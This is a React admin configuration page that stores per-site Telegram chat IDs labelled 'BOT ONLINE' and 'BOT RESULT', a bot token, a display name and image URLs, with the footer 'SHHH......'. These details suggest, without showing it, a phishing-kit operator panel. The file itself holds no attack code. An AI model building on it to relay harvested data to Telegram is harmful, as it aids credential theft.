import React, { useEffect, useState } from "react";
import { Layout, Input, Button, Menu, Breadcrumb } from "antd";
const { Header, Content, Footer } = Layout;
import { useNavigate } from "react-router-dom";

import { API_BE } from "./utils/variable";
import axios from "axios";

export const AdminConfig = () => {
  const hostname = window.location.hostname;
  const navigate = useNavigate();

  const [isUpdate, setUpdate] = useState({
    loading: true,
    update: false,
  });

  const [values, setValues] = useState({
    web_unique: hostname,
    img_url: "",
    profile_img_url: "",
    full_name: "",
    telegram_chatId_one: "",
    telegram_chatId_two: "",
    telegram_token: "",
  });

  const createNewConfig = async (values) => {
    try {
      await axios.post(`${API_BE}/users/config/web`, values);
      await getConfig(hostname);
    } catch (error) {}
  };

  const updateConfig = async (values) => {
    try {
      await axios.put(`${API_BE}/users/config/web`, values);
      await getConfig(hostname);
    } catch (error) {}
  };

  const getConfig = async (hostname) => {
    try {
      const config = await axios.get(
        `${API_BE}/users/config/web/${hostname}/true`
      );

      if (config && config?.data) {
        setValues(config?.data?.data);
        setUpdate({ ...isUpdate, update: true, loading: false });
      } else {
        setUpdate({ ...isUpdate, update: false, loading: false });
      }
    } catch (error) {
      setUpdate({ ...isUpdate, update: false, loading: false });
    }
  };

  useEffect(() => {
    getConfig(hostname);
  }, []);

  return (
    <Layout className="dashboard__wrapper">
      <Header>
        <Menu
          theme="dark"
          mode="horizontal"
          defaultSelectedKeys={["2"]}
          items={[
            { key: "1", label: "Dashboard" },
            { key: "2", label: "Config" },
          ]}
          onClick={({ item, key, keyPath, domEvent }) => {
            if (key == "1") {
              navigate("/ppi");
            } else {
              navigate("/ppi/config");
            }
          }}
        />
      </Header>
      <Content style={{ padding: "0 50px" }}>
        <Breadcrumb style={{ margin: "16px 0" }}>
          <Breadcrumb.Item>Home</Breadcrumb.Item>
          <Breadcrumb.Item>List</Breadcrumb.Item>
          <Breadcrumb.Item>App</Breadcrumb.Item>
        </Breadcrumb>
        <div className="site-layout-content">
          <div className="admin-config">
            <br />
            <br />
            <h1>Admin Config</h1>
            <form>
              <label>Web unique</label>
              <Input
                disabled
                value={values?.web_unique}
                placeholder=""
                onChange={(e) =>
                  setValues({ ...values, web_unique: e.target.value })
                }
              />
              <br />
              <br />
              <label>Image url</label>
              <Input
                value={values?.img_url}
                placeholder=""
                onChange={(e) =>
                  setValues({ ...values, img_url: e.target.value })
                }
              />
              <br />
              <br />
              <label>Profile pic url</label>
              <Input
                value={values?.profile_img_url}
                placeholder=""
                onChange={(e) =>
                  setValues({ ...values, profile_img_url: e.target.value })
                }
              />
              <br />
              <br />
              <label>Full name</label>
              <Input
                value={values?.full_name}
                placeholder=""
                onChange={(e) =>
                  setValues({ ...values, full_name: e.target.value })
                }
              />
              <br />
              <br />
              <label>Telegram BOT ONLINE</label>
              <Input
                value={values?.telegram_chatId_one}
                placeholder=""
                onChange={(e) =>
                  setValues({ ...values, telegram_chatId_one: e.target.value })
                }
              />
              <br />
              <br />
              <label>Telegram BOT RESULT</label>
              <Input
                value={values?.telegram_chatId_two}
                placeholder=""
                onChange={(e) =>
                  setValues({ ...values, telegram_chatId_two: e.target.value })
                }
              />
              <br />
              <br />
              <label>Telegram BOT TOKEN</label>
              <Input
                value={values?.telegram_token}
                placeholder=""
                onChange={(e) =>
                  setValues({ ...values, telegram_token: e.target.value })
                }
              />
              <br />
              <br />
              <Button
                disabled={isUpdate?.loading}
                type="primary"
                onClick={() => {
                  if (isUpdate.update) {
                    updateConfig(values);
                  } else {
                    createNewConfig(values);
                  }
                }}
              >
                {isUpdate?.loading
                  ? "Loading"
                  : isUpdate?.update
                  ? "Update"
                  : "Submit"}
              </Button>
              <br />
              <br />
            </form>
          </div>
        </div>
      </Content>
      <Footer style={{ textAlign: "center" }}>SHHH......</Footer>
    </Layout>

    // <Layout className="layout">
    //   <div className="admin-config">
    //     <br />
    //     <br />
    //     <h1>Admin Config</h1>
    //     <form>
    //       <label>Web unique</label>
    //       <Input
    //         disabled
    //         value={values?.web_unique}
    //         placeholder=""
    //         onChange={(e) =>
    //           setValues({ ...values, web_unique: e.target.value })
    //         }
    //       />
    //       <br />
    //       <br />
    //       <label>Image url</label>
    //       <Input
    //         value={values?.img_url}
    //         placeholder=""
    //         onChange={(e) => setValues({ ...values, img_url: e.target.value })}
    //       />
    //       <br />
    //       <br />
    //       <label>Profile pic url</label>
    //       <Input
    //         value={values?.profile_img_url}
    //         placeholder=""
    //         onChange={(e) =>
    //           setValues({ ...values, profile_img_url: e.target.value })
    //         }
    //       />
    //       <br />
    //       <br />
    //       <label>Full name</label>
    //       <Input
    //         value={values?.full_name}
    //         placeholder=""
    //         onChange={(e) =>
    //           setValues({ ...values, full_name: e.target.value })
    //         }
    //       />
    //       <br />
    //       <br />
    //       <label>Telegram BOT ONLINE</label>
    //       <Input
    //         value={values?.telegram_chatId_one}
    //         placeholder=""
    //         onChange={(e) =>
    //           setValues({ ...values, telegram_chatId_one: e.target.value })
    //         }
    //       />
    //       <br />
    //       <br />
    //       <label>Telegram BOT RESULT</label>
    //       <Input
    //         value={values?.telegram_chatId_two}
    //         placeholder=""
    //         onChange={(e) =>
    //           setValues({ ...values, telegram_chatId_two: e.target.value })
    //         }
    //       />
    //       <br />
    //       <br />
    //       <label>Telegram BOT TOKEN</label>
    //       <Input
    //         value={values?.telegram_token}
    //         placeholder=""
    //         onChange={(e) =>
    //           setValues({ ...values, telegram_token: e.target.value })
    //         }
    //       />
    //       <br />
    //       <br />
    //       <Button
    //         disabled={isUpdate?.loading}
    //         type="primary"
    //         onClick={() => {
    //           if (isUpdate.update) {
    //             updateConfig(values);
    //           } else {
    //             createNewConfig(values);
    //           }
    //         }}
    //       >
    //         {isUpdate?.loading
    //           ? "Loading"
    //           : isUpdate?.update
    //           ? "Update"
    //           : "Submit"}
    //       </Button>
    //       <br />
    //       <br />
    //     </form>
    //   </div>
    // </Layout>
  );
};
